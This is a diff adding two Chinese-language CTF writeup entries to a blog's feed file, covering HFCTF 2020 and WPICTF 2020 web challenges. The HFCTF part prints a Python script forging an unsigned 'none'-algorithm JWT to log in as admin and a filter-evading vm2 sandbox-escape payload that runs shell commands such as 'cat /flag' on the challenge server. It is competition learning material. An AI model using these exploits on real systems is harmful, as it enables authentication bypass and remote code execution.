@@ -4,6 +4,60 @@
   
     
     <entry>
+      <title>hfctf2020部分writeup</title>
+      <link href="/2020/04/19/hfctf2020-bu-fen-writeup/"/>
+      <url>/2020/04/19/hfctf2020-bu-fen-writeup/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>都是知道的知识点，但是总是觉得是自己不会的知识点，</p><p>看都没怎么看就疯狂谷歌，被外国比赛打出阴影了。</p><p>外国比赛基本都是不会的知识点</p><h2 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h2><p>node的题目,扫描看到<code>package.json</code>和<code>app.js</code></p><p>根据<code>require</code>的情况看代码</p><p>api的代码<code>controllers/api.js</code></p><pre><code>const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = {    'POST /api/register': async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || username === 'admin'){            throw new APIError('register error', 'wrong username');        }        if(global.secrets.length &gt; 100000) {            global.secrets = [];        }        const secret = crypto.randomBytes(18).toString('hex');        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});        ctx.rest({            token: token        });        await next();    },    'POST /api/login': async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || !password) {            throw new APIError('login error', 'username or password is necessary');        }        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError('login error', 'no such secret id');        }        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: 'HS256'});        const status = username === user.username &amp;&amp; password === user.password;        if(status) {            ctx.session.username = username;        }        ctx.rest({            status        });        await next();    },    'GET /api/flag': async (ctx, next) =&gt; {        if(ctx.session.username !== 'admin'){            throw new APIError('permission error', 'permission denied');        }        const flag = fs.readFileSync('/flag').toString();        ctx.rest({            flag        });        await next();    },    'GET /api/logout': async (ctx, next) =&gt; {        ctx.session.username = null;        ctx.rest({            status: true        })        await next();    }};</code></pre><p>关键是</p><pre><code> const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: 'HS256'});        const status = username === user.username &amp;&amp; password === user.password;</code></pre><p>这里用了 <code>jsonwebtoken</code></p><p><code>evoa</code>师傅在<code>unctf</code> 出了题目，是关于<code>jsonwebtoken</code>的缺陷的</p><p>使<code>secretid</code>是不存在的，然后伪造</p><pre><code>import jwttoken = jwt.encode({"secretid":"","username":"admin","password":"admin","iat":1587324787},algorithm="none",key="").decode(encoding='utf-8')print(token)#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>然后post</p><pre><code>POST /api/login HTTP/1.1username=admin&amp;password=admin&amp;authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>登录获取<code>cookie</code></p><p>带上这两个<code>cookie</code>然后访问<code>/api/flag</code>获取flag</p><h2 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h2><p>看起来是<code>php</code>，实际上是<code>node</code>，</p><p>在<code>run.php?code=1-1</code> 可以执行代码</p><p>一看名字叫<code>escape</code>就知道又是<code>vm2</code>逃逸了</p><p>过滤了一些东西大概是</p><pre><code>'"+processexecconstructorfor</code></pre><p>这个可以绕过</p><p>用这个方式</p><pre><code>try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}</code></pre><p>那么只要找<code>issues</code>就可以了</p><p>最新的不行逃逸，卡了很多时间，无语了</p><p><a href="https://github.com/patriksimek/vm2/issues/268" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/268</a></p><p>用历史的，<code>2019</code>的可以了</p><p><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p><pre><code>import requestsa='''(function(){    try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}    let buffer = {        hexSlice: () =&gt; ``,        magic: {            get [Symbol[`f\\u006fr`](`n\\u006fdejs.util.inspect.cust\\u006fm`)](){                throw f =&gt; f[`c\\u006fnstruct\\u006fr`](`return pr\\u006fcess`)();            }        }    };    try{        Buffer[`pr\\u006ftotype`][`inspect`][`call`](buffer, 0, { customInspect: true });    }catch(e){        e(()=&gt;0).mainModule.require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`)    }})()'''a='''(function(){    TypeError[`prot\\u006ftype`][`get_pr\\u006fcess`] = f=&gt;f[`c\\u006fnstructor`](`return pr\\u006fcess`)();    try{        Object.preventExtensions(Buffer.from(``)).a = 1;    }catch(e){        return e[`get_pr\\u006fcess`](()=&gt;{}).mainModule[`require`](`child_pr\\u006fcess`)[`\\u0065xecSync`](`cat /flag`).toString();    }})()'''url='http://ca8b55804ed648d3a6e6bad8e66e5f6fd0e8b9cfec904ad7.changame.ichunqiu.com/run.php'param={'code':a}req=requests.get(url=url,params=param)print(req.text)</code></pre><p>打不过打不过，明天去<code>Ha1cyonCTF</code>玩了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WPICTF-2020-部分writeup</title>
+      <link href="/2020/04/18/wpictf2020-bu-fen-writeup/"/>
+      <url>/2020/04/18/wpictf2020-bu-fen-writeup/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前几题还是简单的</p><h2 id="👉👉👉第一题😎👉"><a href="#👉👉👉第一题😎👉" class="headerlink" title="👉👉👉第一题😎👉"></a>👉👉👉第一题😎👉</h2><p><img src="../../../../../../../images/WPICTF2020/123.png" alt=""></p><h2 id="第二题-dorsia2"><a href="#第二题-dorsia2" class="headerlink" title="第二题 dorsia2"></a>第二题 dorsia2</h2><p>描述</p><pre><code>http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The second card.http://dorsia2.wpictf.xyz:31337/index.html or 31338 or 31339Firefox doesnt like the page... try chromium.made by: awgHint: flag in ~/flag.txt</code></pre><p>虽然这题很简单，不过给代码的方式很有趣</p><p><img src="../../../../../../../images/WPICTF2020/code-dorsia2.png" alt=""></p><p><img src="../../../../../../../images/WPICTF2020/dorsia2-etc-passwd.png" alt=""></p><p>最后</p><p><img src="../../../../../../../images/WPICTF2020/dorsia2.png" alt=""></p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>是一个 c的编译器</p><p>通过报错包含得到</p><p><img src="../../../../../../../images/WPICTF2020/autograder.png" alt=""></p><h2 id="Suckmore-Shell2-0-linux"><a href="#Suckmore-Shell2-0-linux" class="headerlink" title="Suckmore Shell2.0 (linux)"></a>Suckmore Shell2.0 (linux)</h2><p>linux 的题目，看到一个很多人做的去混一下</p><p><img src="../../../../../../../images/WPICTF2020/Suckmore-Shell-2.0.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ByteBandits CTF 2020部分writeup-notesapp</title>
       <link href="/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/"/>
       <url>/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/</url>
